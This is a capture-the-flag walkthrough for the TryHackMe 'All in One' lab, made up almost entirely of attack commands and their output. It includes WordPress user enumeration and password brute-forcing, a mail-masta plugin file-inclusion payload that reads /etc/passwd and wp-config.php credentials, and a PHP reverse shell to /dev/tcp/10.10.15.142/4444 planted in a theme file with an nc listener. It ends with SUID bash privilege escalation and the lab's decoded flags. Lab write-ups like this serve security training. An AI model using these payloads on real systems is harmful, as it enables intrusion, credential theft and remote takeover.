# Try Hack Me: All in One

- [TryHackMe Room Link](https://tryhackme.com/r/room/allinonemj)  
- [GitHub Repository](https://github.com/thehackersbrain/All_in_One)  
- [Writeup on Medium](https://medium.com/@od1l1a/tryhackme-all-in-one-writeup-ffba2dc9f39b)  
- [Writeup on Aldeid](https://www.aldeid.com/wiki/TryHackMe-All-in-One)  
- [YouTube Walkthrough](https://www.youtube.com/watch?v=yTRj3IU37nk)

---

## Steps

### Enumeration
1. **Run Nmap Scan**  
```bash
   nmap -sC -sV -A -oN nmap.log 10.10.42.158
```

2. **Run Gobuster**

Using rockyou.txt wordlist:
```bash
gobuster dir -u http://10.10.42.158/ -w /usr/share/wordlists/rockyou.txt
```

Using directory-list-2.3-medium.txt wordlist:
```bash
gobuster dir -u http://10.10.42.158/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. **Run WPScan**
   
Enumerate users:
```bash
wpscan --url http://10.10.42.158/wordpress/ -e u
```

Output:
```bash
User(s) Identified:  
elyana
```

Attempt password brute-forcing:
```bash
wpscan --url http://10.10.42.158/wordpress/ --usernames elyana --passwords /usr/share/wordlists/rockyou.txt
```

### Plugin Vulnerability

1. **Exploiting the Vulnerable Plugin mail-masta:**

View /etc/passwd:
```bash
http://10.10.42.158/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=%2Fetc%2Fpasswd
```

2. **Encode and view wp-config.php:**
```bash
http://10.10.42.158/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fvar%2Fwww%2Fhtml%2Fwordpress%2Fwp-config.php
```

Alternative:
```bash
http://10.10.42.158/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

### Decode Base64
```bash
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk+KiBOI1c8biEqfGtGZE1uUU4pPl49XihpSHA4VXZnPH4ySH56Rl1pZHlRPXtAfTF9KnJ7bFowLFdZJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfU0FMVCcsICdoeDhJOitUejhuMzM1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```

```bash
echo "PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk" | base64 -d
```

```bash
/ ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Other Hint:
http://10.10.42.158/hackathons
```bash
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>
<!-- Dvc W@iyur@123 -->
 KeepGoing
 ```

https://www.dcode.fr/vigenere-cipher
ciphertext: W@iyur@123
key: KeepGoing
Result: H@ckme@123 

### Login Admin Panel:
elyana
H@ckme@123 


Login as admin and got to inactive theme twentyseventeen theme, got to search.php and add:
```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.142/4444 0>&1'");
?>
```

added listener in new terminal:
```bash
nc -lvnp 4444
```

Activated twentyseventeen theme and went to a search resuslts page and walla:
```bash
root@ip-10-10-3-5:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.42.158 40274
bash: cannot set terminal process group (1100): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ ls
ls
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
bash-4.4$ 
```

```bash
cd /home
ls
cd elyana
cat user.txt
cat: user.txt: Permission denied
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

```bash
bash-4.4$ find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"
<e f 2>&1 | grep -v "Permission" | grep -v "No such"

or find / -type f -user elyana 2>/dev/null
```

```bash
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
bash-4.4$
```

```bash
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght

su elyana
E@syR18ght
```

Now that we have elyana’s password, we no longer need the reverse shell and we can connect via SSH directly:
```bash
sshpass -p "E@syR18ght" ssh elyana@10.10.42.158
```
or
```bash
ssh elyana@10.10.42.158
E@syR18ght
```
```bash
-bash-4.4$ cat user.txt 
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
-bash-4.4$ echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

### Escalate Privilidges:

Check SUID Binaries:
```bash
find / -type f -perm -4000 2>/dev/null
https://gtfobins.github.io/gtfobins/bash/
bash -p
whoami
cat /root/root.txt
bash-4.4# pwd
/home/elyana
bash-4.4# cd ..
bash-4.4# ls
elyana
bash-4.4# cd ..
bash-4.4# pwd
/
bash-4.4# ls
bin    dev   initrd.img      lib64	 mnt   root  snap  tmp	vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr	vmlinuz.old
cdrom  home  lib	     media	 proc  sbin  sys   var
bash-4.4# cd root/
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
```

or
```bash
cat /root/root.txt | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```